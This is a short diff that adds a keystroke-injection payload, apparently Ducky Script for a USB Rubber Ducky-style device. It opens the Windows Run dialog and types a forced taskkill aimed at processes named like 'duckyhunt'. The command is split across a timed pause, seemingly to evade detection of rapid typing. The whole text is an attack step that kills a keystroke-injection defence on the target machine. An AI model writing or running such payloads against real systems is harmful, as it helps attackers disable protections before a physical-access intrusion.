@@ -1,0 +1,6 @@
+GUI r
+DELAY 200
+STRING taskkill /F /IM duckyhun
+DELAY 35
+STRING t*
+ENTER
